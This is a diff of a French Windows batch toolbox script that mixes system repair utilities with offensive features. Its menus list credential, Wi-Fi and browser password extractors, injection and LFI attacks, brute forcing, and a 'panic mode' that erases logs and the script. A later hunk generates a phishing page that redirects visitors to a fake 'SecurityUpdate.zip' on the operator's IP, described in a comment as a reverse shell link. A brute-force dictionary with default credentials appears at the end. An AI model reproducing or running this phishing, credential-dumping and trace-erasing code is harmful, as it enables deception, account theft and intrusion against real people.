@@ -100,75 +100,42 @@ set "t[3]=sys_diagnostic_menu:Menu de diagnostic~Regroupe 8 outils d'analyse (Sy
 set "t[4]=---:REPARATION"
 set "t[5]=sys_rescue_menu:Outil Reparation Windows (Rescue)~Menu multi-outils (SFC, DISM, CHKDSK, Reset WinUpdate...)"
 set "t[6]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniatures corrompues"
-set "t[7]=sys_winre:Mode Reparation (WinRE)~Demarrer dans l'environnement de reparation Windows (WinRE/BIOS/Boot Menu/Safe Mode...)"
+set "t[7]=sys_winre:Mode Reparation (WinRE)~Demarrer dans l'environnement de reparation Windows"
 set "t[8]=---:NETTOYAGE ET OPTIMISATION"
-set "t[9]=sys_opti_menu:Menu de Nettoyage et Optimisation~Regroupe le nettoyage (Cache, Registre) et l'optimisation (Tweaks, Demarrage)"
+set "t[9]=sys_opti_menu:Menu de Nettoyage et Optimisation~Regroupe le nettoyage et l'optimisation"
 set "t[10]=---:RESEAU"
 set "t[11]=dns_manager:Gestionnaire DNS~Changer DNS Cloudflare/Google"
-set "t[12]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP, Autoreset)"
-set "t[13]=net_cyber_menu:Scanner de failles et Pentest~Recherche de vulnerabilites Web, Reseau et rapports d'audit"
+set "t[12]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP)"
+set "t[13]=net_cyber_menu:Scanner de failles et Pentest~Recherche de vulnerabilites Web et Reseau"
 set "t[14]=---:DISQUE"
 set "t[15]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
 set "t[16]=---:APPLICATIONS"
 set "t[17]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
-set "t[18]=app_installer:Installateur d'applications~Installer des logiciels par categorie via Winget"
+set "t[18]=app_installer:Installateur d'applications~Installer des logiciels par categorie"
 set "t[19]=---:COMPTES ET SECURITE"
-set "t[20]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi, Nirsoft)"
-set "t[21]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
+set "t[20]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi)"
+set "t[21]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle"
 set "t[22]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
-set "t[23]=sys_av_test:Test Antivirus (EICAR Safe)~Teste votre antivirus avec des faux positifs standards inoffensifs"
-set "t[24]=cyber_privesc_audit:Audit de piratage local (PrivEsc)~Verifie si un intrus peut devenir Administrateur SYSTEM"
-set "t[25]=cyber_gen_htaccess:Protection de serveur Web (.htaccess)~Genere un fichier de securite blinde pour votre site Apache"
+set "t[23]=sys_av_test:Test Antivirus (EICAR Safe)~Tester votre antivirus"
+set "t[24]=cyber_privesc_audit:Audit de piratage local (PrivEsc)~Verifie l'elevation de privileges"
+set "t[25]=cyber_gen_htaccess:Protection de serveur Web (.htaccess)~Genere un fichier blinde"
 set "t[27]=---:EXTRACTION ET SAUVEGARDE"
-set "t[28]=sys_export_menu:Menu des Extractions~Exporte les cles Windows, listes de logiciels, reseaux Wi-Fi et pilotes sur le Bureau"
+set "t[28]=sys_export_menu:Menu des Extractions~Exporte cles, Wi-Fi et pilotes"
 set "t[29]=---:PERSONNALISATION"
 set "t[30]=context_menu:Menu contextuel Windows 11~Classic/Modern"
-set "t[31]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
-set "t[56]=sys_gaming_mode:Mode Gaming~Desactiver/reactiver les services lourds pour booster les perfs jeux"
-set "t[57]=sys_shortcuts_bureau:Raccourcis Bureau 1-Clic~Redemarrer et Eteindre le PC avec icone sur le Bureau"
+set "t[31]=sys_god_mode:Dossier God Mode~Raccourci ultime des parametres"
+set "t[56]=sys_gaming_mode:Mode Gaming~Booster les perfs jeux"
+set "t[57]=sys_shortcuts_bureau:Raccourcis Bureau 1-Clic~Redemarrer/Eteindre"
 set "t[62]=---:MATERIEL"
-set "t[63]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
-set "t[64]=sys_print_manager:Gestionnaire d'Imprimantes~Lister, vider la file d'attente et supprimer des imprimantes"
-set "t[65]=sys_power_plan:Gestionnaire Plan d'Alimentation~Equilibre, Performances, Ultimate Performance (mode cache Windows)"
-:: Sous-items HIDDEN pour gestion des favoris individuels
-set "t[32]=dump_credman:Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump):HIDDEN"
-set "t[33]=dump_wifi:Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms:HIDDEN"
-set "t[34]=sys_nirsoft_pw:WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe:HIDDEN"
-set "t[35]=res_sfc:Scan RAPIDE du systeme~SFC /scannow (Verification systeme rapide):HIDDEN"
-set "t[36]=res_dism_check:Verification image base~DISM /CheckHealth et /ScanHealth (Analyse image):HIDDEN"
-set "t[37]=res_dism_restore:Reparation profonde~DISM /RestoreHealth (Reparation fichiers systeme):HIDDEN"
-set "t[38]=res_temp_clean:Nettoyage massif (Temp/Cache)~Purge des fichiers temporaires et cache Windows Update:HIDDEN"
-set "t[39]=res_wu_reset:Reset Fix Windows Update~Reinitialisation forcee des composants Windows Update:HIDDEN"
-set "t[40]=sys_cleanmgr:Nettoyage de disque (Classique)~Lancement classique de l'utilitaire de nettoyage Windows:HIDDEN"
-:: Items DIAGNOSTIC avances
-set "t[41]=sys_report:Apercu de la configuration PC~Affiche les specifications et l'etat de sante materiel:HIDDEN"
-set "t[42]=sys_diag_network:Diagnostic Reseau~Test de connexion (Local, Box, Internet, DNS):HIDDEN"
-set "t[43]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel:HIDDEN"
-set "t[44]=sys_bitlocker_check:Verificateur BitLocker~Verifiez l'etat de chiffrement de vos partitions:HIDDEN"
-set "t[45]=sys_event_log:Journaux d'Erreurs Windows~Affiche les erreurs critiques recentes (24h / 7 jours):HIDDEN"
-set "t[46]=sys_hw_test:Test des Composants PC~Benchmark disque, RAM, CPU et SMART en un clic:HIDDEN"
-set "t[47]=sys_defender:Gestionnaire Windows Defender~Scan rapide/complet CLI, MAJ signatures, menaces detectees:HIDDEN"
-set "t[48]=sys_full_report:Generer Rapport HTML (Tout-en-Un)~Export HTML de l'ordinateur complet (Materiel, OS, Reseau):HIDDEN"
-:: Items NETTOYAGE avances
-set "t[49]=sys_clean_unified:Nettoyage Complet Unifie~Disque, Temp, Registre, WU, DNS - tout en un menu:HIDDEN"
-set "t[50]=sys_registry_cleanup:Nettoyage du Registre~Optimisation rapide et suppression des entrees mortes:HIDDEN"
-set "t[51]=sys_tweaks_menu:Menu Optimisation Windows 11~Bloatwares, Telemetrie, Performances, Cortana:HIDDEN"
-set "t[52]=sys_startup_manager:Programmes au Demarrage~Lister et desactiver les logiciels qui demarrent avec Windows:HIDDEN"
-:: Items EXTRACTION avances
-set "t[53]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit:HIDDEN"
-set "t[54]=sys_drivers:Extraction des pilotes~Sauvegarde de tous les fichiers pilotes natifs:HIDDEN"
-set "t[55]=sys_export_software:Export Liste des Logiciels~Exporte la liste de tous les programmes installes en CSV/TXT:HIDDEN"
-set "t[61]=sys_export_wifi_apps:Export Wi-Fi + Logiciels (TXT)~Genere 2 fichiers TXT sur le Bureau en un seul clic:HIDDEN"
-set "t[66]=cyber_advanced_inject:Injections Avancees (SSTI/XXE/JWT)~Vecteurs modernes d'attaques serveur et API"
-set "t[67]=cyber_recon_advanced:Reconnaissance Avancee (AXFR, crt.sh, WHOIS...)~Collecte d'informations passive et active"
-set "t[68]=cyber_pentest_report:Rapport Pentest HTML Unifie~Analyse automatisee exhaustive (Vulnerability Scan)"
-set "t[69]=cyber_tls_scan:Scan TLS/SSL Avance~Protocoles faibles, ciphers, certificat, HSTS:HIDDEN"
-set "t[70]=cyber_lfi_scan:LFI et Path Traversal~Lecture de fichiers systeme via parametres URL:HIDDEN"
-set "t[71]=cyber_open_redirect:Open Redirect Avance~40 parametres x 13 payloads de redirection:HIDDEN"
-set "t[72]=cyber_export_json:Export JSON Unifie~Consolide tous findings en JSON importable:HIDDEN"
-set "t[73]=cyber_exposure_audit:Audit d'Exposition des Donnees~Recherche de fichiers sensibles (.env, pass) et envoi de rapport:HIDDEN"
-set "t[74]=cyber_wifi_audit:Analyseur de Securite Wi-Fi~Analyse des SSID et detection de points d'acces suspects (Evil Twin):HIDDEN"
-set "t[75]=cyber_cleanup_local:[!] PANIC MODE : Auto-Destruction~Supprime les logs, le cache et ce script"
+set "t[63]=touch_screen_manager:Gestionnaire Ecran Tactile~Activer/Desactiver"
+set "t[64]=sys_print_manager:Gestionnaire d'Imprimantes~Lister/Vider le Spooler"
+set "t[65]=sys_power_plan:Gestionnaire Plan d'Alimentation~Equilibre/Performances"
+set "t[66]=cyber_advanced_inject:Injections Avancees (SSTI/XXE/JWT)~Attaques serveur et API"
+set "t[67]=cyber_recon_advanced:Reconnaissance Avancee~AXFR, crt.sh, WHOIS"
+set "t[68]=cyber_pentest_report:Rapport Pentest HTML Unifie~Scan exhaustif"
+set "t[73]=cyber_exposure_audit:Audit d'Exposition des Donnees~Recherche fichiers sensibles:HIDDEN"
+set "t[74]=cyber_wifi_audit:Analyseur de Securite Wi-Fi~Detection Evil Twin:HIDDEN"
+set "t[75]=cyber_cleanup_local:[!] PANIC MODE : Auto-Destruction~Nettoyage total:HIDDEN"
 set "total_tools=75"
 
 
@@ -181,29 +148,33 @@ set "opts=[--- MES FAVORIS ---]"
 set /a fav_idx=0
 
 for /l %%I in (1,1,%total_tools%) do (
-    for /f "tokens=1,2,3 delims=:" %%A in ("!t[%%I]!") do (
-        if not "%%A"=="---" (
-            set "is_fav=0"
-            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
-                if "%%F"=="%%A" set "is_fav=1"
-            )
-            if "!is_fav!"=="1" (
-                set "opts=!opts!;(F) %%B"
-                set /a fav_idx+=1
-                set "main_target[!fav_idx!]=%%A"
+    if defined t[%%I] (
+        for /f "tokens=1,2,3 delims=:" %%A in ("!t[%%I]!") do (
+            if not "%%A"=="---" (
+                set "is_fav=0"
+                if exist "%SCRIPT_DIR%\favoris.txt" (
+                    for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
+                        if "%%F"=="%%A" set "is_fav=1"
+                    )
+                )
+                if "!is_fav!"=="1" (
+                    set "opts=!opts!;(F) %%B"
+                    set /a fav_idx+=1
+                    set "main_target[!fav_idx!]=%%A"
+                )
             )
         )
     )
 )
 
 if "!opts!"=="[--- MES FAVORIS ---]" (
-    set "opts=!opts!;(Aucun favori configure - Appuyez sur [F] sur un outil pour l'ajouter)"
+    set "opts=!opts!;(Aucun favori - Appuyez sur [F] pour ajouter)"
     set /a fav_idx+=1
     set "main_target[!fav_idx!]=none"
 )
 
 set "opts=!opts!;[--- OUTILS AVANCES ---];Voir les outils systeme avances"
-set "opts=!opts!;[!] PANIC MODE : Auto-Destruction~Supprime les logs, le cache et ce script"
+set "opts=!opts!;[!] PANIC MODE : Auto-Destruction~Efface les traces et le script"
 
 call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "!opts!"
 set "main_choice=%errorlevel%"
@@ -214,18 +185,20 @@ if "!main_choice!"=="299" goto search_tools
 if !main_choice! GEQ 200 (
     set /a toggle_idx=!main_choice!-200
     for %%X in (!toggle_idx!) do set "toggle_target=!main_target[%%X]!"
-    if not "!toggle_target!"=="none" call :ToggleFav "!toggle_target!"
+    if defined toggle_target if not "!toggle_target!"=="none" call :ToggleFav "!toggle_target!"
     goto menu_principal
 )
 
 set /a v_idx=fav_idx+1
 set /a panic_idx=fav_idx+2
+
 if "!main_choice!"=="!v_idx!" goto system_tools
 if "!main_choice!"=="!panic_idx!" goto cyber_cleanup_local
 
 set "target=!main_target[%main_choice%]!"
 if defined target if not "!target!"=="none" goto !target!
 goto menu_principal
+
 
 REM ===================================================================
 REM                    GESTIONNAIRE DNS CLOUDFLARE
@@ -1937,7 +1910,7 @@ echo   // Ici on simule le lien vers ton script de Reverse Shell
 echo   window.location.href = "http://%my_ip%/SecurityUpdate.zip";
 echo }
 echo ^</script^>^</body^>^</html^>
-) > "%SCRIPT_DIR%index_phishing.html"
+) > "%SCRIPT_DIR%\index_phishing.html"
 
 echo.
 echo [OK] Fichier 'index_phishing.html' genere.
@@ -2258,8 +2231,10 @@ if not exist "%TEMP%\found_ips.txt" (
 )
 
 set "SCRIPT_DIR=%~dp0"
-set "BRUTE_FILE=%SCRIPT_DIR%bruteforce.txt"
-set "SUCCESS_LOG=%SCRIPT_DIR%penetration_success.log"
+if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
+set "BRUTE_FILE=%SCRIPT_DIR%\bruteforce.txt"
+set "SUCCESS_LOG=%SCRIPT_DIR%\penetration_success.log"
+
 if not exist "%BRUTE_FILE%" (
     echo [i] Creation du dictionnaire bruteforce.txt...
     >  "%BRUTE_FILE%" echo admin:admin
